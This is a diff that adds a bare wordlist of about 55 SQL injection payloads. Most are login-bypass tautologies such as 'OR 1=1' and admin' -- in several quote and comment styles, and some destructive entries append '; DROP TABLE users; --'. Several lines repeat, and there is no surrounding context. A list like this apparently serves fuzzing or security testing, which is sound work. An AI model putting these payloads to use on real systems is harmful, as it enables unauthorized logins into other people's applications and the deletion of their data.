@@ -1,0 +1,55 @@
+' OR '1'='1
+' OR 'a'='a
+' OR 1=1 --
+" OR "1"="1
+' OR ''='
+') OR ('a'='a
+') OR (1=1 --
+" OR ""="
+') OR ('a'='a
+') OR ('1'='1
+' OR '1'='1' --
+' OR 'a'='a' --
+' OR 1=1 #
+' OR a=a #
+' OR 1=1/*
+' OR 'a'='a'/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1' --
+admin' or '1'='1'/*
+admin' or '1'='1'#--
+admin' or '1'='1'# #
+admin' or '1'='1'/*
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1" --
+admin" or "1"="1"/*
+admin" or "1"="1"#--
+admin" or "1"="1"# #
+admin" or "1"="1"/*
+admin--1' OR '1'='1
+admin--1' OR '1'='1' --
+admin--1' OR '1'='1'/*
+' OR '1=1
+' OR '1'='1'--
+' OR 'x'='x'; DROP TABLE users; --
+' OR 'x'='x'
+' OR 1=1
+' or 1=1 --
+' OR 1 --
+' OR 1=1 --
+' OR 1=1#
+' OR '1'='1' --
+' OR '1'='1'#
+' OR '1'='1'; DROP TABLE users; --
+' OR '1'='1' --
+' OR 'x'='x'; DROP TABLE users; --
+' OR 1=1 #
+' OR 1=1--
+' OR 1=1/*--
+'
